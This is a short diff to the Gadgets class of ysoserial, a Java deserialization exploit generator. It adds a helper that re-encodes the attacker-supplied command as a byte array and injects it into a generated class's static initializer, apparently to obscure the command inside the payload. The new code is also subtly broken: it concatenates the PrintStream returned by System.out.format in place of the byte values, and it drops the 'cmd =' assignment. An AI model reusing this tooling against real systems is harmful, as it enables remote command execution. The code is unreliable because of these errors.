@@ -207,7 +207,17 @@ public class Gadgets {
         }
     }
 
-
+public static String Str2ByteStr(String s){
+        byte a[]=s.getBytes();
+        String szRst = "new String(new byte[]{";
+        for(int i = 0; i < a.length;i++){
+            if (0 < i){
+                szRst += ",";
+            }
+            szRst += System.out.format("%d",a[i]);
+        }
+        return szRst + "})";
+}
     public static <T> T createTemplatesImpl(Class myClass, final String command, byte[] bytes, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory) throws Exception {
         final T templates = tplClass.newInstance();
         byte[] classBytes = new byte[0];
@@ -237,7 +247,9 @@ public class Gadgets {
         if (command != null) {
             ctClass = pool.get("ysoserial.payloads.templates.CommandTemplate");
             ctClass.setName(ctClass.getName() + System.nanoTime());
-            String cmd1 = "cmd = \"" + command + "\";";
+//            String cmd1 = "cmd = \"" + command + "\";";
+            String cmd1 = Str2ByteStr(command)+";";
+
             ctClass.makeClassInitializer().insertBefore(cmd1);
             ctClass.setSuperclass(superC);
             classBytes = ctClass.toBytecode();
